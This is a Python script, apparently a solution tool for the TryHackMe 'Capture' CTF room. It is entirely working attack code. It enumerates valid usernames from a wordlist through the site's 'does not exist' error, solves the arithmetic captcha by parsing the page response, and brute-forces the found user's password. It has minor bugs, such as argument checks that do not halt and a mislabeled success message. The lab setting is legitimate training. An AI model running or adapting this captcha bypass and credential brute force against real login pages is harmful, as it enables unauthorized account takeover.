import requests
import argparse

parser = argparse.ArgumentParser(
	prog="Capture Escape",
	description="A script to beat the captcha implemented on THMs Capture CTF.\nURL: https://tryhackme.com/r/room/capture",
	epilog="Thanks for checking this out I suppose...")

parser.add_argument("-u", "--url", help="The URL of the targets login page.")
parser.add_argument("-l", "--login-list", help="The wordlist used against usernames.")
parser.add_argument("-p", "--password-list", help="The worlist used against passwords.")

arguments = parser.parse_args()

def main(arguments):
	banner()
	print("[?] Please include the required arguments:")
	print("[>] -u | The URL of the targets login page.")
	print("[>] -l | The wordlist used against usernames.")
	print("[>] -p | The worlist used against passwords.\n")
	check_arguments(arguments)
	initial_sequence()
	username = crack_login()

	if(username == "USERNAME NOT FOUND"):
		print("[!] No username matched.")
		print("[!] Exiting...")
		exit()

	password = crack_password(username)

	if(password == "PASSWORD NOT FOUND"):
		print("[!] Username: " + username)
		print("[!] No password matched.")
		print("[!] Exiting...")
		exit()

	print("[!] Brute force successful!")
	print("[!] Username: " + username)
	print("[!] Password: " + password)
	exit()

def banner():
	banner = """
   .d8888b.        d8888 8888888b. 88888888888 888     888 8888888b.  8888888888 
  d88P  Y88b      d88888 888   Y88b    888     888     888 888   Y88b 888        
  888    888     d88P888 888    888    888     888     888 888    888 888        
  888           d88P 888 888   d88P    888     888     888 888   d88P 8888888    
  888          d88P  888 8888888P"     888     888     888 8888888P"  888        
  888    888  d88P   888 888           888     888     888 888 T88b   888        
  Y88b  d88P d8888888888 888           888     Y88b. .d88P 888  T88b  888        
   "Y8888P" d88P     888 888           888      "Y88888P"  888   T88b 8888888888
 ================================================================================
 ================================================================================
  8888888888 .d8888b.   .d8888b.        d8888 8888888b.  8888888888 
  888       d88P  Y88b d88P  Y88b      d88888 888   Y88b 888        
  888       Y88b.      888    888     d88P888 888    888 888        
  8888888    "Y888b.   888           d88P 888 888   d88P 8888888    
  888           "Y88b. 888          d88P  888 8888888P"  888        
  888             "888 888    888  d88P   888 888        888        
  888       Y88b  d88P Y88b  d88P d8888888888 888        888        
  8888888888 "Y8888P"   "Y8888P" d88P     888 888        8888888888 
	"""
	
	print(banner)

def check_arguments(arguments):
	print("[+] Checking arguments passed...")
	
	if(not arguments.url):
		print("[!] Please specify the target URL using: -u")
		return

	if(not arguments.login_list):
		print("[!] Please specify the wordlist for login details.")
		return

	if(not arguments.password_list):
		print("[!] Please specify the wordlist for passwords.")
		return

	print("[+] Arguments accepted.")

def capture_bypass(captcha):
	if captcha[1] == '+':
	    solution = int(captcha[0]) + int(captcha[2])
	elif captcha[1] == '-':
	    solution = int(captcha[0]) - int(captcha[2])
	elif captcha[1] == '*':
	    solution = int(captcha[0]) * int(captcha[2])
	elif captcha[1] == '/':
	    solution = int(captcha[0]) / int(captcha[2])
	return solution

def form_submit(target,username,password):
	if("http" not in arguments.url):
		url = "http://" + arguments.url
	else:
		url = arguments.url

	print("[+] Testing for captcha...")

	test_request = requests.post(
		url,
		data="username=onion&password=pirate",
		headers={'Content-Type': 'application/x-www-form-urlencoded'})

	captcha = test_request.text.split("\n")[96]

	if(captcha):
		print("[!] Catpcha triggered.")

		if(target == "captcha"):
			return True

		print("[+] Captcha: \"" + str(captcha) + "\"")
		solution = str(capture_bypass(captcha.split()))
		print("[!] Captcha solution found: " + solution)
	else:
		print("[+] No captcha found.")
		print("[!] Exiting brute force for retry...")
		return False

	print("[+] Making POST request...")

	post_request = requests.post(
		url,
		data="username=" + username + "&password=" + password + "&captcha=" + solution,
		headers={'Content-Type': 'application/x-www-form-urlencoded'})

	if(target == "username"):
		if("does not exist" not in post_request.text.split("\n")[104]):
			print("[!] Username found: " + username)
			return True
		else:
			return False
	elif(target == "password"):
		if(len(post_request.text) < 100):
			print("[!] Username found: " + username)
			return True
		else:
			return False

def initial_sequence():
	print("[+] Forcing captcha through failed logins...")

	for iteration in range(0,10):
		success = form_submit("captcha","onion","pirate")

		if(success):
			break

def crack_login():
	print("[+] Starting username brute force...")

	file = open("./" + arguments.login_list, "r")

	for username in file:
		success = form_submit("username",username.strip(),"pirate")

		if(success):
			return username.strip()

	return "USERNAME NOT FOUND"

def crack_password(username):
	print("[+] Starting password brute force...")

	file = open("./" + arguments.password_list, "r")

	for password in file:
		success = form_submit("password",username,password.strip())

		if(success):
			return password.strip()

	return "PASSWORD NOT FOUND"

main(arguments)
